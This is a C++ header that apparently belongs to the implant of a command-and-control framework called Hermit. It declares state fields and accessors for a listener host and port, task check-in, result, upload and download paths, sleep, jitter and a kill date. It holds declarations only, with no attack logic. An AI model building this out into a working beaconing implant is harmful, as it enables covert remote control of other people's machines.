#ifndef HERMIT_STATE_HPP
#define HERMIT_STATE_HPP

#include <windows.h>
#include <winhttp.h>
#include <string>

namespace State
{
    struct State
    {
        HINSTANCE hInstance;
        INT nCmdShow;
        LPCWSTR lpPayloadType;
        LPCWSTR lpListenerProtocol;
        LPCWSTR lpListenerHost;
        INTERNET_PORT nListenerPort;
        LPCWSTR lpReqPathCheckIn;
        LPCWSTR lpReqPathDownload;
        LPCWSTR lpReqPathTaskGet;
        LPCWSTR lpReqPathTaskResult;
        LPCWSTR lpReqPathUpload;
        LPCWSTR lpReqPathWebSocket;
        INT nSleep;
        INT nJitter;
        INT nKillDate;
        std::wstring wUUID;
        std::wstring wTask;
        std::wstring wTaskResult;
        HINTERNET hSession;
        HINTERNET hConnect;
        HINTERNET hRequest;
        BOOL bQuit;
    };

	struct StateManager {
		State currState;

        VOID SetHInstance(HINSTANCE hInstance);
        VOID SetCmdShow(INT nCmdShow);
        VOID SetPayloadType(LPCWSTR wPayloadType);
        VOID SetListenerProtocol(LPCWSTR lpProtocol);
		VOID SetListenerHost(LPCWSTR lpHost);
		VOID SetListenerPort(INTERNET_PORT nPort);
        VOID SetReqPathCheckIn(LPCWSTR lpReqPathCheckIn);
        VOID SetReqPathDownload(LPCWSTR lpReqPathDownload);
        VOID SetReqPathTaskGet(LPCWSTR lpReqPathTaskGet);
        VOID SetReqPathTaskResult(LPCWSTR lpReqPathTaskResult);
        VOID SetReqPathUpload(LPCWSTR lpReqPathUpload);
        VOID SetReqPathWebSocket(LPCWSTR lpReqPathWebSocket);
		VOID SetSleep(INT nSleep);
		VOID SetJitter(INT nJitter);
		VOID SetKillDate(INT nKillDate);
		VOID SetUUID(const std::wstring& wUUID);
		VOID SetTask(const std::wstring& wTask);
        VOID SetTaskResult(const std::wstring& wTaskResult);
		VOID SetHSession(HINTERNET hSession);
		VOID SetHConnect(HINTERNET hConnect);
		VOID SetHRequest(HINTERNET hRequest);
        VOID SetQuit(BOOL bQuit);

        HINSTANCE GetHInstance() const;
        INT GetCmdShow() const;
        LPCWSTR GetPayloadType() const;
        LPCWSTR GetListenerProtocol() const;
		LPCWSTR GetListenerHost() const;
		INTERNET_PORT GetListenerPort() const;
        LPCWSTR GetReqPathCheckIn() const;
        LPCWSTR GetReqPathDownload() const;
        LPCWSTR GetReqPathTaskGet() const;
        LPCWSTR GetReqPathTaskResult() const;
        LPCWSTR GetReqPathUpload() const;
        LPCWSTR GetReqPathWebSocket() const;
		INT GetSleep() const;
		INT GetJitter() const;
		INT GetKillDate() const;
		std::wstring GetUUID() const;
		std::wstring GetTask() const;
        std::wstring GetTaskResult() const;
		HINTERNET GetHSession() const;
		HINTERNET GetHConnect() const;
		HINTERNET GetHRequest() const;
        BOOL GetQuit() const;
	};
}

#endif // HERMIT_STATE_HPP